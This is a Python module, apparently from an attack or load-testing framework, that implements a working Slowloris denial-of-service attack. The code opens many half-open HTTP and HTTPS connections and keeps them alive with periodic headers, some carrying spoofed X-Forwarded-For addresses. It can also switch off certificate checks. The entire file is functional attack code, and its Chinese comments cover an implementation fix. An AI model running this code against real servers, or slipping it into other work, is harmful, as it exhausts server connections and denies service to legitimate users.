from __future__ import annotations

import asyncio
import socket
import ssl
import random
import time
from typing import List, Optional
import structlog

from app.attacks.base import SafeAttackBase, AttackRegistry
from app.models import AttackCommand, AttackParams, AttackType, AttackStatus

logger = structlog.get_logger(__name__)


class SlowlorisConnection:
    """Slowloris 连接包装

    P2 修复: 改用 asyncio.open_connection (StreamReader/StreamWriter)。
    原实现对已连接 socket 重复 sock_connect 并对客户端套接字调用
    sock_accept (要求监听态), HTTPS 分支必然异常且被静默吞掉。
    open_connection 由事件循环正确完成 TCP/TLS 握手, writer.write +
    drain 提供背压感知的半开连接维持。
    """

    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        self.reader = reader
        self.writer = writer
        self.created_at = time.monotonic()
        self.last_activity = time.monotonic()

    async def send_line(self, line: str) -> None:
        """发送单行 (不结束请求), 失败抛出由调用方判定连接死亡"""
        self.writer.write(line.encode() + b"\r\n")
        await self.writer.drain()
        self.last_activity = time.monotonic()

    def close(self):
        try:
            self.writer.close()
        except Exception:
            pass


class SlowlorisAttack(SafeAttackBase):
    """
    Slowloris 慢速攻击 - 保持大量半开连接，定期发送 Header 维持存活
    """

    NAME = "slowloris"
    ATTACK_TYPE = AttackType.SLOWLORIS
    REQUIRES_ROOT = False
    DEFAULT_RPS = 100
    DEFAULT_CONCURRENCY = 300

    HEADER_LINES = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "X-Forwarded-For: {random_ip}",
        "X-Requested-With: XMLHttpRequest",
    ]

    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self.connections: List[SlowlorisConnection] = []
        self._connection_semaphore: Optional[asyncio.Semaphore] = None

    async def _run(self):
        target = self.params.target
        self._connection_semaphore = asyncio.Semaphore(self.params.concurrency)

        builder = asyncio.create_task(self._connection_builder(target))
        self._tasks.append(builder)

        keeper = asyncio.create_task(self._connection_keeper(target))
        self._tasks.append(keeper)

        await asyncio.gather(builder, keeper, return_exceptions=True)

    async def _create_connection(self, target) -> Optional[SlowlorisConnection]:
        """建立半开连接: 发送请求行 + Host 后停住, 不发送空行终结请求"""
        use_tls = target.port == 443 or self.params.use_https
        ssl_ctx: Optional[ssl.SSLContext] = None
        if use_tls:
            ssl_ctx = ssl.create_default_context()
            if not self.params.verify_ssl:
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    target.ip, target.port, ssl=ssl_ctx,
                    # 内网 IP 直连: 关闭 hostname 校验语义由 ssl_ctx 控制
                ),
                timeout=10.0,
            )
            conn = SlowlorisConnection(reader, writer)

            request_line = f"{self.params.method} {target.path} HTTP/1.1"
            host = target.host_header or f"{target.ip}:{target.port}"
            ua = f"User-Agent: Mozilla/5.0 (compatible; Slowloris/{random.randint(1, 999)})"

            await conn.send_line(request_line)
            await conn.send_line(f"Host: {host}")
            await conn.send_line(ua)
            return conn
        except Exception as e:
            logger.debug("slowloris_connect_failed", error=str(e))
            return None

    async def _connection_builder(self, target):
        while not self._check_stop():
            await self._connection_semaphore.acquire()

            if self._check_stop():
                self._connection_semaphore.release()
                break

            conn = await self._create_connection(target)
            if conn:
                self.connections.append(conn)
                self.result.total_requests += 1
                self.result.successful_requests += 1
            else:
                self.result.failed_requests += 1
                self._connection_semaphore.release()

            await asyncio.sleep(1.0 / max(1, self.params.rps / max(1, self.params.concurrency)))

    async def _connection_keeper(self, target):
        interval = self.params.slowloris_interval

        while not self._check_stop():
            await asyncio.sleep(interval)

            if self._check_stop():
                break

            dead_connections = []

            for conn in list(self.connections):
                if self._check_stop():
                    break

                try:
                    header = random.choice(self.HEADER_LINES).format(
                        random_ip=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    )
                    await conn.send_line(header)
                except Exception as e:
                    logger.debug("slowloris_keep_failed", error=str(e))
                    dead_connections.append(conn)

            for dead in dead_connections:
                if dead in self.connections:
                    self.connections.remove(dead)
                self._connection_semaphore.release()
                dead.close()

    async def stop(self, reason: str = "manual"):
        logger.info("slowloris_stop_requested", attack_id=self.attack_id, reason=reason)
        self._stop_event.set()
        for task in self._tasks:
            if not task.done():
                task.cancel()
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)

    async def _cleanup(self):
        await super()._cleanup()
        for conn in self.connections:
            conn.close()
        self.connections.clear()


AttackRegistry.register(AttackType.SLOWLORIS, SlowlorisAttack)
